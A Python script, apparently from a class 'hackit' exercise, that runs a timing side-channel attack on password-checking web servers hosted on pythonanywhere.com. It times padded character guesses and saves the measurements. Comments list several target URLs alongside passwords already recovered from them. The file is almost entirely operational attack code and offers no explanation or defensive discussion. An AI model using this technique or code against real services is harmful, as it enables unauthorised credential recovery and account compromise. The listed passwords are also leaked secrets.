from hackit_functions import *

REPEAT_CHECK = 8
POOL = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890'
PADDING_LENGTH = 12
MAX_PASSWORD_LENGTH = 6
# URL = "https://barfishilev.pythonanywhere.com/" # --> password = 6UsP9o
# URL = "https://romy.pythonanywhere.com/check/" # --> password = k4m7z2
# URL = "https://shohamchen.pythonanywhere.com/"  # --> password = c0oK5
# URL = "https://guylevi171109.pythonanywhere.com/" # --> X
# URL = "https://omer123.pythonanywhere.com/" # --> X
URL = "https://maayan.pythonanywhere.com/" # --> X
# URL = "https://yoavshaar.pythonanywhere.com/"


def get_data(url, pool, password_length, padding_length):
    """
    Check time of each char to each possition:
               a
              aa
             aaa
    ...
    aaaaaaaaaaaa

    and
          a
          aa
          aaa
          ...
          aaaaaa
    """
    server_name = extract_name(url)
    log_save(f"Starting collecting data from {URL}", server_name)

    # ---------------- RIGHT SIDE ----------------
    right_filename = f"{server_name}_right_measurements.json"
    time_measurements_r = {}

    for i in list(range(1, password_length + 2)) + [11, 12]:
        time_measurements_r[i] = {}
        log_save(f"\n--- Checking position {i} ---", server_name)
        log_save(f"{url + ' ' * (padding_length - i) + i * '^'}", server_name)

        for ch in pool:
            test_password = (padding_length - i) * ' ' + i * ch
            test_url = url + test_password

            t = timeit(test_url, REPEAT_CHECK)

            time_measurements_r[i][ch] = t

            log_save(f"POS: {i} | CHAR: {ch} | TIME: {t}", server_name)

            save_json(time_measurements_r, right_filename)


    # ---------------- LEFT SIDE ----------------
    left_filename = f"{server_name}_left_measurements.json"
    time_measurements_l = {}

    for i in range(1, password_length + 1):
        time_measurements_l[i] = {}
        log_save(f"\n--- Reverse checking position {i} ---", server_name)
        log_save(f"{url + (padding_length - password_length) * ' ' + i * '^'}",
                 server_name)

        for ch in pool:
            test_password = (i * ch).ljust(password_length, " ")
            test_url = url + test_password

            t = timeit(test_url, REPEAT_CHECK)

            time_measurements_l[i][ch] = t

            log_save(f"REVERSE_POS: {i} | CHAR: {ch} | TIME: {t}", server_name)

            save_json(time_measurements_l, left_filename)


def get_chars_data(log_filename):
    """Check time of each char in each possition"""
    for ch in POOL:
        for i in range(0, MAX_PASSWORD_LENGTH):
            test_password = ' ' * (PADDING_LENGTH - MAX_PASSWORD_LENGTH) + i * ' ' + ch + (MAX_PASSWORD_LENGTH - i - 1) * ' '
            t = timeit(URL + test_password, 10)
            t2 = timeit(URL + test_password, 5)
            log_save(f"CHAR: {ch} | POS: {i} | TIME: {t}", log_filename)
            if abs(t - t2) > 0.1:
                log_save(f"This was random, t={t2}", log_filename)
        log_save("======================", log_filename)            


if __name__ == '__main__':
    get_data(URL, POOL, MAX_PASSWORD_LENGTH, PADDING_LENGTH)
    